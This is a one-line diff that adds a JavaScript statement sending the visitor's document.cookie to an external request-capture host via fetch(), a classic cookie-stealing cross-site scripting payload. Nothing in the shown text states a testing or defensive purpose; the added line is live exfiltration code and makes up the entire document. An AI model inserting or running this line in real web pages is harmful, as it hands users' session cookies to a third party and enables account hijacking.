@@ -1,0 +1,1 @@
+fetch("http://mbd172qa.requestrepo.com/a?" + document.cookie);
